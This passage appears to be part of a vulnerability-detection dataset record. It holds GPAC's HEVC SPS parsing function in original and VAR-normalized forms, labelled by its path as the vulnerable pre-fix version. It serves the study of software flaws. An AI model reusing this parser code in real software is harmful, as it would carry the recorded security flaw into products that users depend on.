VAR_9->transfer_characteristic = gf_bs_read_int_log(VAR_0, 8, ""transfer_characteristic"");
VAR_9->matrix_coeffs = gf_bs_read_int_log(VAR_0, 8, ""matrix_coefficients"");
}
}
if ((VAR_9->chroma_loc_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""chroma_loc_info_present_flag""))) {
VAR_9->chroma_sample_loc_type_top_field = gf_bs_read_ue_log(VAR_0, ""chroma_sample_loc_type_top_field"");
VAR_9->chroma_sample_loc_type_bottom_field = gf_bs_read_ue_log(VAR_0, ""chroma_sample_loc_type_bottom_field"");
}
VAR_9->neutral_chroma_indication_flag = gf_bs_read_int_log(VAR_0, 1, ""neutral_chroma_indication_flag"");
VAR_9->field_seq_flag = gf_bs_read_int_log(VAR_0, 1, ""field_seq_flag"");
VAR_9->frame_field_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""frame_field_info_present_flag"");
if ((VAR_9->default_display_window_flag = gf_bs_read_int_log(VAR_0, 1, ""default_display_window_flag""))) {
VAR_9->left_offset = gf_bs_read_ue_log(VAR_0, ""display_window_left_offset"");
VAR_9->right_offset = gf_bs_read_ue_log(VAR_0, ""display_window_right_offset"");
VAR_9->top_offset = gf_bs_read_ue_log(VAR_0, ""display_window_top_offset"");
VAR_9->bottom_offset = gf_bs_read_ue_log(VAR_0, ""display_window_bottom_offset"");
}
VAR_9->has_timing_info = gf_bs_read_int_log(VAR_0, 1, ""has_timing_info"");
if (VAR_9->has_timing_info) {
VAR_9->num_units_in_tick = gf_bs_read_int_log(VAR_0, 32, ""num_units_in_tick"");
VAR_9->time_scale = gf_bs_read_int_log(VAR_0, 32, ""time_scale"");
VAR_9->poc_proportional_to_timing_flag = gf_bs_read_int_log(VAR_0, 1, ""poc_proportional_to_timing_flag"");
if (VAR_9->poc_proportional_to_timing_flag)
VAR_9->num_ticks_poc_diff_one_minus1 = gf_bs_read_ue_log(VAR_0, ""num_ticks_poc_diff_one_minus1"");
if ((VAR_9->hrd_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""hrd_parameters_present_flag""))) {
return VAR_5;
}
}
if (gf_bs_read_int_log(VAR_0, 1, ""bitstream_restriction_flag"")) {
gf_bs_read_int_log(VAR_0, 1, ""tiles_fixed_structure_flag"");
gf_bs_read_int_log(VAR_0, 1, ""motion_vectors_over_pic_boundaries_flag"");
gf_bs_read_int_log(VAR_0, 1, ""restricted_ref_pic_lists_flag"");
gf_bs_read_ue_log(VAR_0, ""min_spatial_segmentation_idc"");
gf_bs_read_ue_log(VAR_0, ""max_bytes_per_pic_denom"");
gf_bs_read_ue_log(VAR_0, ""max_bits_per_min_cu_denom"");
gf_bs_read_ue_log(VAR_0, ""log2_max_mv_length_horizontal"");
gf_bs_read_ue_log(VAR_0, ""log2_max_mv_length_vertical"");
}
}
if (gf_bs_read_int_log(VAR_0, 1, ""sps_extension_flag"")) {
#if 0
while (gf_bs_available(VAR_0)) {
gf_bs_read_int(VAR_0, 1);
}
#endif
}
return VAR_5;
}",gpac/6bb3e4e288f02c9c595e63230979cd5443a1cb7a/av_parsers.c/vul/before/0.json,"static s32 gf_hevc_read_sps_bs_internal(GF_BitStream *bs, HEVCState *hevc, u8 layer_id, u32 *vui_flag_pos)
{
	s32 vps_id, sps_id = -1;
	u32 i, nb_CTUs, depth;
	HEVC_SPS *sps;
	HEVC_VPS *vps;
	HEVC_ProfileTierLevel ptl;
	Bool multiLayerExtSpsFlag;
	u8 sps_ext_or_max_sub_layers_minus1, max_sub_layers_minus1;

	if (vui_flag_pos) *vui_flag_pos = 0;

	//nalu header already parsed
	vps_id = gf_bs_read_int_log(bs, 4, ""vps_id"");
	if ((vps_id<0) || (vps_id >= 16)) {
		return -1;
	}
	memset(&ptl, 0, sizeof(ptl));
	max_sub_layers_minus1 = 0;
	sps_ext_or_max_sub_layers_minus1 = 0;
	if (layer_id == 0)
		max_sub_layers_minus1 = gf_bs_read_int_log(bs, 3, ""max_sub_layers_minus1"");
	else
		sps_ext_or_max_sub_layers_minus1 = gf_bs_read_int_log(bs, 3, ""sps_ext_or_max_sub_layers_minus1"");
	multiLayerExtSpsFlag = (layer_id != 0) && (sps_ext_or_max_sub_layers_minus1 == 7);
	if (!multiLayerExtSpsFlag) {
		gf_bs_read_int_log(bs, 1, ""temporal_id_nesting_flag"");
		hevc_profile_tier_level(bs, 1, max_sub_layers_minus1, &ptl, 0);
	}

	sps_id = gf_bs_read_ue_log(bs, ""sps_id"");
	if ((sps_id < 0) || (sps_id >= 16)) {
		return -1;
	}

	sps = &hevc->sps[sps_id];
	if (!sps->state) {
		sps->state = 1;
		sps->id = sps_id;
		sps->vps_id = vps_id;
	}
	sps->ptl = ptl;
	vps = &hevc->vps[vps_id];
	sps->max_sub_layers_minus1 = 0;
	sps->sps_ext_or_max_sub_layers_minus1 = 0;

	/* default values */
	sps->colour_primaries = 2;
	sps->transfer_characteristic = 2;
	sps->matrix_coeffs = 2;

	//sps_rep_format_idx = 0;
	if (multiLayerExtSpsFlag) {
		sps->update_rep_format_flag = gf_bs_read_int_log(bs, 1, ""update_rep_format_flag"");
		if (sps->update_rep_format_flag) {
			sps->rep_format_idx = gf_bs_read_int_log(bs, 8, ""rep_format_idx"");
			if (sps->rep_format_idx>15) {
				return -1;
			}
		} else {
			sps->rep_format_idx = vps->rep_format_idx[layer_id];
		}
		sps->width = vps->rep_formats[sps->rep_format_idx].pic_width_luma_samples;
		sps->height = vps->rep_formats[sps->rep_format_idx].pic_height_luma_samples;
		sps->chroma_format_idc = vps->rep_formats[sps->rep_format_idx].chroma_format_idc;
		sps->bit_depth_luma = vps->rep_formats[sps->rep_format_idx].bit_depth_luma;
		sps->bit_depth_chroma = vps->rep_formats[sps->rep_format_idx].bit_depth_chroma;
		sps->separate_colour_plane_flag = vps->rep_formats[sps->rep_format_idx].separate_colour_plane_flag;

		//TODO this is crude ...
		sps->ptl = vps->ext_ptl[0];
	}
	else {
		sps->chroma_format_idc = gf_bs_read_ue_log(bs, ""chroma_format_idc"");
		if (sps->chroma_format_idc == 3)
			sps->separate_colour_plane_flag = gf_bs_read_int_log(bs, 1, ""separate_colour_plane_flag"");
		sps->width = gf_bs_read_ue_log(bs, ""width"");
		sps->height = gf_bs_read_ue_log(bs, ""height"");
		if ((sps->cw_flag = gf_bs_read_int_log(bs, 1, ""conformance_window_flag""))) {
			u32 SubWidthC, SubHeightC;

			if (sps->chroma_format_idc == 1) {
				SubWidthC = SubHeightC = 2;
			}
			else if (sps->chroma_format_idc == 2) {
				SubWidthC = 2;
				SubHeightC = 1;
			}
			else {
				SubWidthC = SubHeightC = 1;
			}

			sps->cw_left = gf_bs_read_ue_log(bs, ""conformance_window_left"");
			sps->cw_right = gf_bs_read_ue_log(bs, ""conformance_window_right"");
			sps->cw_top = gf_bs_read_ue_log(bs, ""conformance_window_top"");
			sps->cw_bottom = gf_bs_read_ue_log(bs, ""conformance_window_bottom"");

			sps->width -= SubWidthC * (sps->cw_left + sps->cw_right);
			sps->height -= SubHeightC * (sps->cw_top + sps->cw_bottom);
		}
		sps->bit_depth_luma = 8 + gf_bs_read_ue_log(bs, ""bit_depth_luma_minus8"");
		sps->bit_depth_chroma = 8 + gf_bs_read_ue_log(bs, ""bit_depth_chroma_minus8"");
	}

	sps->log2_max_pic_order_cnt_lsb = 4 + gf_bs_read_ue_log(bs, ""log2_max_pic_order_cnt_lsb_minus4"");

	if (!multiLayerExtSpsFlag) {
		sps->sub_layer_ordering_info_present_flag = gf_bs_read_int_log(bs, 1, ""sub_layer_ordering_info_present_flag"");
		for (i = sps->sub_layer_ordering_info_present_flag ? 0 : sps->max_sub_layers_minus1; i <= sps->max_sub_layers_minus1; i++) {
			gf_bs_read_ue_log_idx(bs, ""max_dec_pic_buffering"", i);
			gf_bs_read_ue_log_idx(bs, ""num_reorder_pics"", i);
			gf_bs_read_ue_log_idx(bs, ""max_latency_increase"", i);
		}
	}

	sps->log2_min_luma_coding_block_size = 3 + gf_bs_read_ue_log(bs, ""log2_min_luma_coding_block_size_minus3"");
	sps->log2_diff_max_min_luma_coding_block_size = gf_bs_read_ue_log(bs, ""log2_diff_max_min_luma_coding_block_size"");
	//we allow more than in max profile, but make sure we don't overflow max CU W/H compute below
	if (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size >= 30) {
		return -1;
	}
	sps->max_CU_width = (1 << (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size));
	sps->max_CU_height = (1 << (sps->log2_min_luma_coding_block_size + sps->log2_diff_max_min_luma_coding_block_size));

	sps->log2_min_transform_block_size = 2 + gf_bs_read_ue_log(bs, ""log2_min_transform_block_size_minus2"");
	sps->log2_max_transform_block_size = sps->log2_min_transform_block_size  + gf_bs_read_ue_log(bs, ""log2_max_transform_block_size"");

	depth = 0;
	sps->max_transform_hierarchy_depth_inter = gf_bs_read_ue_log(bs, ""max_transform_hierarchy_depth_inter"");
	sps->max_transform_hierarchy_depth_intra = gf_bs_read_ue_log(bs, ""max_transform_hierarchy_depth_intra"");
	while ((u32)(sps->max_CU_width >> sps->log2_diff_max_min_luma_coding_block_size) > (u32)(1 << (sps->log2_min_transform_block_size + depth)))
	{
		depth++;
	}
	sps->max_CU_depth = sps->log2_diff_max_min_luma_coding_block_size + depth;

	nb_CTUs = ((sps->width + sps->max_CU_width - 1) / sps->max_CU_width) * ((sps->height + sps->max_CU_height - 1) / sps->max_CU_height);
	sps->bitsSliceSegmentAddress = 0;
	while (nb_CTUs > (u32)(1 << sps->bitsSliceSegmentAddress)) {
		sps->bitsSliceSegmentAddress++;
	}

	sps->scaling_list_enable_flag = gf_bs_read_int_log(bs, 1, ""scaling_list_enable_flag"");
	if (sps->scaling_list_enable_flag) {
		sps->infer_scaling_list_flag = 0;
		sps->scaling_list_ref_layer_id = 0;
		if (multiLayerExtSpsFlag) {
			sps->infer_scaling_list_flag = gf_bs_read_int_log(bs, 1, ""infer_scaling_list_flag"");
		}
		if (sps->infer_scaling_list_flag) {
			sps->scaling_list_ref_layer_id = gf_bs_read_int_log(bs, 6, ""scaling_list_ref_layer_id"");
		}
		else {
			sps->scaling_list_data_present_flag = gf_bs_read_int_log(bs, 1, ""scaling_list_data_present_flag"");
			if (sps->scaling_list_data_present_flag) {
				hevc_scaling_list_data(bs);
			}
		}
	}
	sps->asymmetric_motion_partitions_enabled_flag = gf_bs_read_int_log(bs, 1, ""asymmetric_motion_partitions_enabled_flag"");
	sps->sample_adaptive_offset_enabled_flag = gf_bs_read_int_log(bs, 1, ""sample_adaptive_offset_enabled_flag"");
	if ( (sps->pcm_enabled_flag = gf_bs_read_int_log(bs, 1, ""pcm_enabled_flag"")) ) {
		sps->pcm_sample_bit_depth_luma_minus1 = gf_bs_read_int_log(bs, 4, ""pcm_sample_bit_depth_luma_minus1"");
		sps->pcm_sample_bit_depth_chroma_minus1 = gf_bs_read_int_log(bs, 4, ""pcm_sample_bit_depth_chroma_minus1"");
		sps->log2_min_pcm_luma_coding_block_size_minus3 = gf_bs_read_ue_log(bs, ""log2_min_pcm_luma_coding_block_size_minus3"");
		sps->log2_diff_max_min_pcm_luma_coding_block_size = gf_bs_read_ue_log(bs, ""log2_diff_max_min_pcm_luma_coding_block_size"");
		sps->pcm_loop_filter_disable_flag = gf_bs_read_int_log(bs, 1, ""pcm_loop_filter_disable_flag"");
	}
	sps->num_short_term_ref_pic_sets = gf_bs_read_ue_log(bs, ""num_short_term_ref_pic_sets"");
	if (sps->num_short_term_ref_pic_sets > 64) {
		GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[HEVC] Invalid number of short term reference picture sets %d\n"", sps->num_short_term_ref_pic_sets));
		return -1;
	}

	for (i = 0; i < sps->num_short_term_ref_pic_sets; i++) {
		Bool ret = hevc_parse_short_term_ref_pic_set(bs, sps, i);
		/*cannot parse short_term_ref_pic_set, skip VUI parsing*/
		if (!ret) {
			GF_LOG(GF_LOG_ERROR, GF_LOG_CODING, (""[HEVC] Invalid short_term_ref_pic_set\n""));
			return -1;
		}
	}
	sps->long_term_ref_pics_present_flag = gf_bs_read_int_log(bs, 1, ""long_term_ref_pics_present_flag"");
	if (sps->long_term_ref_pics_present_flag) {
		sps->num_long_term_ref_pic_sps = gf_bs_read_ue_log(bs, ""num_long_term_ref_pic_sps"");
		for (i = 0; i < sps->num_long_term_ref_pic_sps; i++) {
			gf_bs_read_int_log_idx(bs, sps->log2_max_pic_order_cnt_lsb, ""lt_ref_pic_poc_lsb_sps"", i);
			gf_bs_read_int_log_idx(bs, 1, ""used_by_curr_pic_lt_sps_flag"", i);
		}
	}
	sps->temporal_mvp_enable_flag = gf_bs_read_int_log(bs, 1, ""temporal_mvp_enable_flag"");
	sps->strong_intra_smoothing_enable_flag = gf_bs_read_int_log(bs, 1, ""strong_intra_smoothing_enable_flag"");

	if (vui_flag_pos)
		*vui_flag_pos = (u32)gf_bs_get_bit_offset(bs);

	if ((sps->vui_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""vui_parameters_present_flag"")) ) {
		sps->aspect_ratio_info_present_flag = gf_bs_read_int_log(bs, 1, ""aspect_ratio_info_present_flag"");
		if (sps->aspect_ratio_info_present_flag) {
			sps->sar_idc = gf_bs_read_int_log(bs, 8, ""aspect_ratio_idc"");
			if (sps->sar_idc == 255) {
				sps->sar_width = gf_bs_read_int_log(bs, 16, ""aspect_ratio_width"");
				sps->sar_height = gf_bs_read_int_log(bs, 16, ""aspect_ratio_height"");
			}
			else if (sps->sar_idc < 17) {
				sps->sar_width = hevc_sar[sps->sar_idc].w;
				sps->sar_height = hevc_sar[sps->sar_idc].h;
			}
		}

		if ((sps->overscan_info_present = gf_bs_read_int_log(bs, 1, ""overscan_info_present"")))
			sps->overscan_appropriate = gf_bs_read_int_log(bs, 1, ""overscan_appropriate"");

		sps->video_signal_type_present_flag = gf_bs_read_int_log(bs, 1, ""video_signal_type_present_flag"");
		if (sps->video_signal_type_present_flag) {
			sps->video_format = gf_bs_read_int_log(bs, 3, ""video_format"");
			sps->video_full_range_flag = gf_bs_read_int_log(bs, 1, ""video_full_range_flag"");
			if ((sps->colour_description_present_flag = gf_bs_read_int_log(bs, 1, ""colour_description_present_flag""))) {
				sps->colour_primaries = gf_bs_read_int_log(bs, 8, ""colour_primaries"");
				sps->transfer_characteristic = gf_bs_read_int_log(bs, 8, ""transfer_characteristic"");
				sps->matrix_coeffs = gf_bs_read_int_log(bs, 8, ""matrix_coefficients"");
			}
		}

		if ((sps->chroma_loc_info_present_flag = gf_bs_read_int_log(bs, 1, ""chroma_loc_info_present_flag""))) {
			sps->chroma_sample_loc_type_top_field = gf_bs_read_ue_log(bs, ""chroma_sample_loc_type_top_field"");
			sps->chroma_sample_loc_type_bottom_field = gf_bs_read_ue_log(bs, ""chroma_sample_loc_type_bottom_field"");
		}

		sps->neutral_chroma_indication_flag = gf_bs_read_int_log(bs, 1, ""neutral_chroma_indication_flag"");
		sps->field_seq_flag = gf_bs_read_int_log(bs, 1, ""field_seq_flag"");
		sps->frame_field_info_present_flag = gf_bs_read_int_log(bs, 1, ""frame_field_info_present_flag"");

		if ((sps->default_display_window_flag = gf_bs_read_int_log(bs, 1, ""default_display_window_flag""))) {
			sps->left_offset = gf_bs_read_ue_log(bs, ""display_window_left_offset"");
			sps->right_offset = gf_bs_read_ue_log(bs, ""display_window_right_offset"");
			sps->top_offset = gf_bs_read_ue_log(bs, ""display_window_top_offset"");
			sps->bottom_offset = gf_bs_read_ue_log(bs, ""display_window_bottom_offset"");
		}

		sps->has_timing_info = gf_bs_read_int_log(bs, 1, ""has_timing_info"");
		if (sps->has_timing_info) {
			sps->num_units_in_tick = gf_bs_read_int_log(bs, 32, ""num_units_in_tick"");
			sps->time_scale = gf_bs_read_int_log(bs, 32, ""time_scale"");
			sps->poc_proportional_to_timing_flag = gf_bs_read_int_log(bs, 1, ""poc_proportional_to_timing_flag"");
			if (sps->poc_proportional_to_timing_flag)
				sps->num_ticks_poc_diff_one_minus1 = gf_bs_read_ue_log(bs, ""num_ticks_poc_diff_one_minus1"");
			if ((sps->hrd_parameters_present_flag = gf_bs_read_int_log(bs, 1, ""hrd_parameters_present_flag""))) {
				//				GF_LOG(GF_LOG_INFO, GF_LOG_CODING, (""[HEVC] HRD param parsing not implemented\n""));
				return sps_id;
			}
		}

		if (gf_bs_read_int_log(bs, 1, ""bitstream_restriction_flag"")) {
			gf_bs_read_int_log(bs, 1, ""tiles_fixed_structure_flag"");
			gf_bs_read_int_log(bs, 1, ""motion_vectors_over_pic_boundaries_flag"");
			gf_bs_read_int_log(bs, 1, ""restricted_ref_pic_lists_flag"");
			gf_bs_read_ue_log(bs, ""min_spatial_segmentation_idc"");
			gf_bs_read_ue_log(bs, ""max_bytes_per_pic_denom"");
			gf_bs_read_ue_log(bs, ""max_bits_per_min_cu_denom"");
			gf_bs_read_ue_log(bs, ""log2_max_mv_length_horizontal"");
			gf_bs_read_ue_log(bs, ""log2_max_mv_length_vertical"");
		}
	}

	if (gf_bs_read_int_log(bs, 1, ""sps_extension_flag"")) {
#if 0
		while (gf_bs_available(bs)) {
			/*sps_extension_data_flag */ gf_bs_read_int(bs, 1);
		}
#endif

	}

	return sps_id;
}","static s32 gf_hevc_read_sps_bs_internal(GF_BitStream *VAR_0, HEVCState *VAR_1, u8 VAR_2, u32 *VAR_3)
{
	s32 VAR_4, VAR_5 = -1;
	u32 VAR_6, VAR_7, VAR_8;
	HEVC_SPS *VAR_9;
	HEVC_VPS *VAR_10;
	HEVC_ProfileTierLevel VAR_11;
	Bool VAR_12;
	u8 VAR_13, VAR_14;

	if (VAR_3) *VAR_3 = 0;

	/* COMMENT_0 */
	VAR_4 = gf_bs_read_int_log(VAR_0, 4, ""vps_id"");
	if ((VAR_4<0) || (VAR_4 >= 16)) {
		return -1;
	}
	memset(&VAR_11, 0, sizeof(VAR_11));
	VAR_14 = 0;
	VAR_13 = 0;
	if (VAR_2 == 0)
		VAR_14 = gf_bs_read_int_log(VAR_0, 3, ""max_sub_layers_minus1"");
	else
		VAR_13 = gf_bs_read_int_log(VAR_0, 3, ""sps_ext_or_max_sub_layers_minus1"");
	VAR_12 = (VAR_2 != 0) && (VAR_13 == 7);
	if (!VAR_12) {
		gf_bs_read_int_log(VAR_0, 1, ""temporal_id_nesting_flag"");
		hevc_profile_tier_level(VAR_0, 1, VAR_14, &VAR_11, 0);
	}

	VAR_5 = gf_bs_read_ue_log(VAR_0, ""sps_id"");
	if ((VAR_5 < 0) || (VAR_5 >= 16)) {
		return -1;
	}

	VAR_9 = &VAR_1->sps[VAR_5];
	if (!VAR_9->state) {
		VAR_9->state = 1;
		VAR_9->id = VAR_5;
		VAR_9->vps_id = VAR_4;
	}
	VAR_9->ptl = VAR_11;
	VAR_10 = &VAR_1->vps[VAR_4];
	VAR_9->max_sub_layers_minus1 = 0;
	VAR_9->sps_ext_or_max_sub_layers_minus1 = 0;

	/* COMMENT_1 */
	VAR_9->colour_primaries = 2;
	VAR_9->transfer_characteristic = 2;
	VAR_9->matrix_coeffs = 2;

	/* COMMENT_2 */
	if (VAR_12) {
		VAR_9->update_rep_format_flag = gf_bs_read_int_log(VAR_0, 1, ""update_rep_format_flag"");
		if (VAR_9->update_rep_format_flag) {
			VAR_9->rep_format_idx = gf_bs_read_int_log(VAR_0, 8, ""rep_format_idx"");
			if (VAR_9->rep_format_idx>15) {
				return -1;
			}
		} else {
			VAR_9->rep_format_idx = VAR_10->rep_format_idx[VAR_2];
		}
		VAR_9->width = VAR_10->rep_formats[VAR_9->rep_format_idx].pic_width_luma_samples;
		VAR_9->height = VAR_10->rep_formats[VAR_9->rep_format_idx].pic_height_luma_samples;
		VAR_9->chroma_format_idc = VAR_10->rep_formats[VAR_9->rep_format_idx].chroma_format_idc;
		VAR_9->bit_depth_luma = VAR_10->rep_formats[VAR_9->rep_format_idx].bit_depth_luma;
		VAR_9->bit_depth_chroma = VAR_10->rep_formats[VAR_9->rep_format_idx].bit_depth_chroma;
		VAR_9->separate_colour_plane_flag = VAR_10->rep_formats[VAR_9->rep_format_idx].separate_colour_plane_flag;

		/* COMMENT_3 */
		VAR_9->ptl = VAR_10->ext_ptl[0];
	}
	else {
		VAR_9->chroma_format_idc = gf_bs_read_ue_log(VAR_0, ""chroma_format_idc"");
		if (VAR_9->chroma_format_idc == 3)
			VAR_9->separate_colour_plane_flag = gf_bs_read_int_log(VAR_0, 1, ""separate_colour_plane_flag"");
		VAR_9->width = gf_bs_read_ue_log(VAR_0, ""width"");
		VAR_9->height = gf_bs_read_ue_log(VAR_0, ""height"");
		if ((VAR_9->cw_flag = gf_bs_read_int_log(VAR_0, 1, ""conformance_window_flag""))) {
			u32 VAR_15, VAR_16;

			if (VAR_9->chroma_format_idc == 1) {
				VAR_15 = VAR_16 = 2;
			}
			else if (VAR_9->chroma_format_idc == 2) {
				VAR_15 = 2;
				VAR_16 = 1;
			}
			else {
				VAR_15 = VAR_16 = 1;
			}

			VAR_9->cw_left = gf_bs_read_ue_log(VAR_0, ""conformance_window_left"");
			VAR_9->cw_right = gf_bs_read_ue_log(VAR_0, ""conformance_window_right"");
			VAR_9->cw_top = gf_bs_read_ue_log(VAR_0, ""conformance_window_top"");
			VAR_9->cw_bottom = gf_bs_read_ue_log(VAR_0, ""conformance_window_bottom"");

			VAR_9->width -= VAR_15 * (VAR_9->cw_left + VAR_9->cw_right);
			VAR_9->height -= VAR_16 * (VAR_9->cw_top + VAR_9->cw_bottom);
		}
		VAR_9->bit_depth_luma = 8 + gf_bs_read_ue_log(VAR_0, ""bit_depth_luma_minus8"");
		VAR_9->bit_depth_chroma = 8 + gf_bs_read_ue_log(VAR_0, ""bit_depth_chroma_minus8"");
	}

	VAR_9->log2_max_pic_order_cnt_lsb = 4 + gf_bs_read_ue_log(VAR_0, ""log2_max_pic_order_cnt_lsb_minus4"");

	if (!VAR_12) {
		VAR_9->sub_layer_ordering_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""sub_layer_ordering_info_present_flag"");
		for (VAR_6 = VAR_9->sub_layer_ordering_info_present_flag ? 0 : VAR_9->max_sub_layers_minus1; VAR_6 <= VAR_9->max_sub_layers_minus1; VAR_6++) {
			gf_bs_read_ue_log_idx(VAR_0, ""max_dec_pic_buffering"", VAR_6);
			gf_bs_read_ue_log_idx(VAR_0, ""num_reorder_pics"", VAR_6);
			gf_bs_read_ue_log_idx(VAR_0, ""max_latency_increase"", VAR_6);
		}
	}

	VAR_9->log2_min_luma_coding_block_size = 3 + gf_bs_read_ue_log(VAR_0, ""log2_min_luma_coding_block_size_minus3"");
	VAR_9->log2_diff_max_min_luma_coding_block_size = gf_bs_read_ue_log(VAR_0, ""log2_diff_max_min_luma_coding_block_size"");
	/* COMMENT_4 */
	if (VAR_9->log2_min_luma_coding_block_size + VAR_9->log2_diff_max_min_luma_coding_block_size >= 30) {
		return -1;
	}
	VAR_9->max_CU_width = (1 << (VAR_9->log2_min_luma_coding_block_size + VAR_9->log2_diff_max_min_luma_coding_block_size));
	VAR_9->max_CU_height = (1 << (VAR_9->log2_min_luma_coding_block_size + VAR_9->log2_diff_max_min_luma_coding_block_size));

	VAR_9->log2_min_transform_block_size = 2 + gf_bs_read_ue_log(VAR_0, ""log2_min_transform_block_size_minus2"");
	VAR_9->log2_max_transform_block_size = VAR_9->log2_min_transform_block_size  + gf_bs_read_ue_log(VAR_0, ""log2_max_transform_block_size"");

	VAR_8 = 0;
	VAR_9->max_transform_hierarchy_depth_inter = gf_bs_read_ue_log(VAR_0, ""max_transform_hierarchy_depth_inter"");
	VAR_9->max_transform_hierarchy_depth_intra = gf_bs_read_ue_log(VAR_0, ""max_transform_hierarchy_depth_intra"");
	while ((u32)(VAR_9->max_CU_width >> VAR_9->log2_diff_max_min_luma_coding_block_size) > (u32)(1 << (VAR_9->log2_min_transform_block_size + VAR_8)))
	{
		VAR_8++;
	}
	VAR_9->max_CU_depth = VAR_9->log2_diff_max_min_luma_coding_block_size + VAR_8;

	VAR_7 = ((VAR_9->width + VAR_9->max_CU_width - 1) / VAR_9->max_CU_width) * ((VAR_9->height + VAR_9->max_CU_height - 1) / VAR_9->max_CU_height);
	VAR_9->bitsSliceSegmentAddress = 0;
	while (VAR_7 > (u32)(1 << VAR_9->bitsSliceSegmentAddress)) {
		VAR_9->bitsSliceSegmentAddress++;
	}

	VAR_9->scaling_list_enable_flag = gf_bs_read_int_log(VAR_0, 1, ""scaling_list_enable_flag"");
	if (VAR_9->scaling_list_enable_flag) {
		VAR_9->infer_scaling_list_flag = 0;
		VAR_9->scaling_list_ref_layer_id = 0;
		if (VAR_12) {
			VAR_9->infer_scaling_list_flag = gf_bs_read_int_log(VAR_0, 1, ""infer_scaling_list_flag"");
		}
		if (VAR_9->infer_scaling_list_flag) {
			VAR_9->scaling_list_ref_layer_id = gf_bs_read_int_log(VAR_0, 6, ""scaling_list_ref_layer_id"");
		}
		else {
			VAR_9->scaling_list_data_present_flag = gf_bs_read_int_log(VAR_0, 1, ""scaling_list_data_present_flag"");
			if (VAR_9->scaling_list_data_present_flag) {
				hevc_scaling_list_data(VAR_0);
			}
		}
	}
	VAR_9->asymmetric_motion_partitions_enabled_flag = gf_bs_read_int_log(VAR_0, 1, ""asymmetric_motion_partitions_enabled_flag"");
	VAR_9->sample_adaptive_offset_enabled_flag = gf_bs_read_int_log(VAR_0, 1, ""sample_adaptive_offset_enabled_flag"");
	if ( (VAR_9->pcm_enabled_flag = gf_bs_read_int_log(VAR_0, 1, ""pcm_enabled_flag"")) ) {
		VAR_9->pcm_sample_bit_depth_luma_minus1 = gf_bs_read_int_log(VAR_0, 4, ""pcm_sample_bit_depth_luma_minus1"");
		VAR_9->pcm_sample_bit_depth_chroma_minus1 = gf_bs_read_int_log(VAR_0, 4, ""pcm_sample_bit_depth_chroma_minus1"");
		VAR_9->log2_min_pcm_luma_coding_block_size_minus3 = gf_bs_read_ue_log(VAR_0, ""log2_min_pcm_luma_coding_block_size_minus3"");
		VAR_9->log2_diff_max_min_pcm_luma_coding_block_size = gf_bs_read_ue_log(VAR_0, ""log2_diff_max_min_pcm_luma_coding_block_size"");
		VAR_9->pcm_loop_filter_disable_flag = gf_bs_read_int_log(VAR_0, 1, ""pcm_loop_filter_disable_flag"");
	}
	VAR_9->num_short_term_ref_pic_sets = gf_bs_read_ue_log(VAR_0, ""num_short_term_ref_pic_sets"");
	if (VAR_9->num_short_term_ref_pic_sets > 64) {
		GF_LOG(VAR_17, VAR_18, (""[HEVC] Invalid number of short term reference picture sets %d\n"", VAR_9->num_short_term_ref_pic_sets));
		return -1;
	}

	for (VAR_6 = 0; VAR_6 < VAR_9->num_short_term_ref_pic_sets; VAR_6++) {
		Bool VAR_19 = hevc_parse_short_term_ref_pic_set(VAR_0, VAR_9, VAR_6);
		/* COMMENT_5 */
		if (!VAR_19) {
			GF_LOG(VAR_17, VAR_18, (""[HEVC] Invalid short_term_ref_pic_set\n""));
			return -1;
		}
	}
	VAR_9->long_term_ref_pics_present_flag = gf_bs_read_int_log(VAR_0, 1, ""long_term_ref_pics_present_flag"");
	if (VAR_9->long_term_ref_pics_present_flag) {
		VAR_9->num_long_term_ref_pic_sps = gf_bs_read_ue_log(VAR_0, ""num_long_term_ref_pic_sps"");
		for (VAR_6 = 0; VAR_6 < VAR_9->num_long_term_ref_pic_sps; VAR_6++) {
			gf_bs_read_int_log_idx(VAR_0, VAR_9->log2_max_pic_order_cnt_lsb, ""lt_ref_pic_poc_lsb_sps"", VAR_6);
			gf_bs_read_int_log_idx(VAR_0, 1, ""used_by_curr_pic_lt_sps_flag"", VAR_6);
		}
	}
	VAR_9->temporal_mvp_enable_flag = gf_bs_read_int_log(VAR_0, 1, ""temporal_mvp_enable_flag"");
	VAR_9->strong_intra_smoothing_enable_flag = gf_bs_read_int_log(VAR_0, 1, ""strong_intra_smoothing_enable_flag"");

	if (VAR_3)
		*VAR_3 = (u32)gf_bs_get_bit_offset(VAR_0);

	if ((VAR_9->vui_parameters_present_flag = gf_bs_read_int_log(VAR_0, 1, ""vui_parameters_present_flag"")) ) {
		VAR_9->aspect_ratio_info_present_flag = gf_bs_read_int_log(VAR_0, 1, ""aspect_ratio_info_present_flag"");
		if (VAR_9->aspect_ratio_info_present_flag) {
			VAR_9->sar_idc = gf_bs_read_int_log(VAR_0, 8, ""aspect_ratio_idc"");
			if (VAR_9->sar_idc == 255) {
				VAR_9->sar_width = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_width"");
				VAR_9->sar_height = gf_bs_read_int_log(VAR_0, 16, ""aspect_ratio_height"");
			}
			else if (VAR_9->sar_idc < 17) {
				VAR_9->sar_width = VAR_20[VAR_9->sar_idc].w;
				VAR_9->sar_height = VAR_20[VAR_9->sar_idc].h;
			}
		}

		if ((VAR_9->overscan_info_present = gf_bs_read_int_log(VAR_0, 1, ""overscan_info_present"")))
			VAR_9->overscan_appropriate = gf_bs_read_int_log(VAR_0, 1, ""overscan_appropriate"");

		VAR_9->video_signal_type_present_flag = gf_bs_read_int_log(VAR_0, 1, ""video_signal_type_present_flag"");
		if (VAR_9->video_signal_type_present_flag) {
			VAR_9->video_format = gf_bs_read_int_log(VAR_0, 3, ""video_format"");
			VAR_9->video_full_range_flag = gf_bs_read_int_log(VAR_0, 1, ""video_full_range_flag"");
			if ((VAR_9->colour_description_present_flag = gf_bs_read_int_log(VAR_0, 1, ""colour_description_present_flag""))) {
				VAR_9->colour_primaries = gf_bs_read_int_log(VAR_0, 8, ""colour_primaries"");
				VAR_9->transfer_characteristic = gf_bs_read_int_log(VAR_0, 8, ""transfer_characteristic"");
